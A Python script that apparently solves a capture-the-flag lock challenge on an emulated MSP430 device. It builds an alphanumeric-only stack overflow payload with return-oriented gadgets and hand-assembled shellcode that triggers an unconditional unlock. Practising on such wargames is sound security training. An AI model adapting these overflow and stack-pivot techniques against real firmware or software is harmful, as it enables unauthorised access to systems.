from struct import pack

def to_addr(addr: int) -> bytes:
    return pack('<H', addr)

buf_addr = 0x43ed

'''
4600:  0212           push	sr
4602:  0f4e           mov	r14, r15
4604:  8f10           swpb	r15
4606:  024f           mov	r15, sr
4608:  32d0 0080      bis	#0x8000, sr
460c:  b012 1000      call	#0x10

in order to return to the address, need 0x4600 somewhere
since only alphanumerical will be copied, no way to introduce 0x00 from payload,
utilize the fact the byte before input being copied in is always 0x00.

**have payload led w/ 0x46 to have 0x4600 (little-endian) in the code**
'''
payload = bytes([0x46])

asm = '''
; with the help of the listing, https://gist.github.com/rmmh/8515577

; set r14 = 0x7f (for unconditional unlock)
6e 4b                mov.b @R11,R14 ; r14 = [r11] = 0x79
6e 52                add.b 4,R14    ; r14 = 0x7d
6e 53                add.b 2,R14    ; r14 = 0x7f

; set up sp s.t. pointing to 0x4600 @ `ret` in shellcode
; sp = 0xXX04
61 54                add.b @R4,SP   ; sp = 0x0004 + [r4] = 0x??
31 50 78 43          add #0x4378,SP ; sp = buf_addr - 1 = 0x43ec = 0x?? (= 0x74) + 0x4378
; r4 = 0x74 - 0x4 = 0x70
30 41                ret            ; ret to 0x4600
'''.split('\n')
shellcode = bytes.fromhex(''.join([i.split('  ')[0] for i in asm if i != '' and i[0] != ';']).replace(' ', ''))
r4_value = 0x70
r11_value = 0x79

# 0x4430 is the lowest address that can be represented by alphanumerical after the buf
padding = 15
r11 = 0x4430
r4 = r11 + 2
shellcode_loc = r4 + 2

pop_r4 = 0x446c

'''
[input buf on stack (copied from 0x2400 ONLY ALPHANUM)]
0x00
...                     ; padding
r11 value               ; pop r11 @ 45f6
addr to `pop r4; ret;`  ; gadget #1: set up r4 for `sp`
addr to `shellcode`     ; gadget #2: shellcode
'''
payload = payload.ljust(padding, b'a')
payload += to_addr(r11) + to_addr(pop_r4) + to_addr(r4) + to_addr(shellcode_loc)
payload = payload.ljust(r11 - buf_addr, b'b')
payload += bytes([r11_value, 0x41, r4_value, 0x41])
payload += shellcode

print (payload.decode())
